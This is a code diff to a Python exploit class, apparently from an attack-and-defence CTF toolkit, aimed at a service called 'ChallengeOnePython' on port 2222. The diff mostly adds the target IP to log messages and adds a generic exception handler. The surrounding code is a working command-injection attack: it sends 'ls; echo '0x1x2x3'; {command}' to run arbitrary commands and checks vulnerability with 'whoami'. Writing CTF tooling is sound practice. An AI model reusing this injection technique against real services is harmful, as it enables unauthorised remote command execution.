@@ -14,15 +14,15 @@ class ChallengeOnePython(Exploit):
 
 	def run_custom_command(self, command):
 		port = 2222
-		logger.info(f"Connecting to port {port}...")
+		logger.debug(f"{self.ip_address} - Connecting to port {port}...")
 		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		socket_connection.settimeout(3)
 		socket_connection.connect((self.ip_address, port))
 		socket_connection.settimeout(None)
-		logger.info(f"Successfully connected to port {port}.")
+		logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")
 
 		exploit_command = f"ls; echo '0x1x2x3'; {command}" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
-		logger.info(f"Running command `{exploit_command}`...")
+		logger.debug(f"{self.ip_address} - Running command `{exploit_command}`...")
 		socket_connection.sendall(exploit_command.encode())
 		socket_connection.shutdown(socket.SHUT_WR)
 		socket_response = ""
@@ -37,25 +37,28 @@ class ChallengeOnePython(Exploit):
 			server_output = socket_response.split("0x1x2x3")[1].strip() # split on `0x1x2x3` so we can parse for the command injection output
 			return server_output
 		except IndexError:
-			raise PatchedException("The target is patched")
+			raise PatchedException(f"{self.ip_address} - The target is patched")
 
 	def test_if_vulnerable(self):
 		"""
 		Returns True if vulnerable and False if not
 		"""
 		try:
-			logger.info("Testing if the target is vulnerable to ChallengeOnePython...")
+			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeOnePython...")
 			command = "whoami"
 			try:
 				self.run_custom_command(command=command)
-				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeOnePython!{COLOR_END}")
+				logger.info(f"{COLOR_OKGREEN}{self.ip_address} - The target is vulnerable to ChallengeOnePython!{COLOR_END}")
 				return True
 			except ConnectionRefusedError:
-				logger.info(f"{COLOR_ORANGE}The challenge one python service is not running!{COLOR_END}")
+				logger.info(f"{COLOR_ORANGE}{self.ip_address} - The challenge one python service is not running!{COLOR_END}")
 				return False
 			except socket.timeout:
-				logger.info(f"{COLOR_ORANGE}The challenge one python service timed out!{COLOR_END}")
+				logger.info(f"{COLOR_ORANGE}{self.ip_address} - The challenge one python service timed out!{COLOR_END}")
 				return False
 		except PatchedException:
-			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
+			return False
+		except Exception:
+			logger.info(f"{COLOR_ORANGE}{self.ip_address} - Something went wrong while checking if ChallengeOnePython is vulnerable.{COLOR_END}")
 			return False
